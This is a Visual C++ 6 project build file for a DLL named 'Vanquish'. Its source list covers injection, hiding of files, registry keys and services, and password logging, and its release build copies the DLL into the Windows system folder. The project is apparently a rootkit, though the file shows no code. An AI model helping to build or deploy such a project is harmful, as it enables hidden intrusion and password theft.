# Microsoft Developer Studio Project File - Name="Vanquish_dll" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Dynamic-Link Library" 0x0102

CFG=Vanquish_dll - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Vanquish_dll.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Vanquish_dll.mak" CFG="Vanquish_dll - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Vanquish_dll - Win32 Release" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE "Vanquish_dll - Win32 Debug" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "Vanquish_dll - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MT /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /YX /FD /c
# ADD CPP /nologo /Gz /W3 /D "NDEBUG" /D "WIN32" /D "_WINDOWS" /D _WIN32_WINNT=0x0500 /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /o "NUL" /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /o "NUL" /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /dll /machine:I386
# ADD LINK32 kernel32.lib user32.lib advapi32.lib /nologo /base:"0x01ae0000" /entry:"__Entry_DllMain" /subsystem:windows /dll /machine:I386 /nodefaultlib /out:"Release/vanquish.dll" /opt:ref /opt:icf,5 /release
# SUBTRACT LINK32 /pdb:none
# Begin Custom Build - Copying DLL to SystemRoot
TargetPath=.\Release\vanquish.dll
TargetName=vanquish
InputPath=.\Release\vanquish.dll
SOURCE="$(InputPath)"

"$(TargetName)" : $(SOURCE) "$(INTDIR)" "$(OUTDIR)"
	copy $(TargetPath) %SystemRoot%\vanquish.dll

# End Custom Build

!ELSEIF  "$(CFG)" == "Vanquish_dll - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MTd /W3 /Gm /GX /Zi /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /YX /FD /c
# ADD CPP /nologo /Gz /MTd /W3 /Gm /GX /ZI /Od /D "_DEBUG" /D "WIN32" /D "_WINDOWS" /D _WIN32_WINNT=0x0500 /YX /FD /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /o "NUL" /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /o "NUL" /win32
# ADD BASE RSC /l 0x409 /d "_DEBUG"
# ADD RSC /l 0x409 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /dll /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib advapi32.lib /nologo /entry:"__Entry_DllMain" /subsystem:windows /dll /debug /machine:I386 /nodefaultlib /out:"Debug/vanquish.dll" /pdbtype:sept
# Begin Custom Build - Copying DLL to DebugV
TargetPath=.\Debug\vanquish.dll
TargetName=vanquish
InputPath=.\Debug\vanquish.dll
SOURCE="$(InputPath)"

"$(TargetName)" : $(SOURCE) "$(INTDIR)" "$(OUTDIR)"
	copy $(TargetPath) ..\DebugV\Debug\vanquish.dll

# End Custom Build

!ENDIF 

# Begin Target

# Name "Vanquish_dll - Win32 Release"
# Name "Vanquish_dll - Win32 Debug"
# Begin Group "Injector"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\Injector.cpp
# End Source File
# Begin Source File

SOURCE=..\Injector.h
# End Source File
# End Group
# Begin Group "Utils"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\Utils.cpp
# End Source File
# Begin Source File

SOURCE=..\Utils.h
# End Source File
# End Group
# Begin Group "DLL"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Vanquish_dll.cpp
# End Source File
# Begin Source File

SOURCE=.\Vanquish_dll.h
# End Source File
# End Group
# Begin Group "APIs"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\vDllUtils.cpp
# End Source File
# Begin Source File

SOURCE=.\vDllUtils.h
# End Source File
# Begin Source File

SOURCE=.\vHideFiles.cpp
# End Source File
# Begin Source File

SOURCE=.\vHideFiles.h
# End Source File
# Begin Source File

SOURCE=.\vHideReg.cpp
# End Source File
# Begin Source File

SOURCE=.\vHideReg.h
# End Source File
# Begin Source File

SOURCE=.\vHideServices.cpp
# End Source File
# Begin Source File

SOURCE=.\vHideServices.h
# End Source File
# Begin Source File

SOURCE=.\vPwdLog.cpp
# End Source File
# Begin Source File

SOURCE=.\vPwdLog.h
# End Source File
# Begin Source File

SOURCE=.\vSourceProtect.cpp
# End Source File
# Begin Source File

SOURCE=.\vSourceProtect.h
# End Source File
# End Group
# Begin Source File

SOURCE=..\ReadMe.en
# End Source File
# Begin Source File

SOURCE=.\Vanquish_dll.rc
# End Source File
# End Target
# End Project
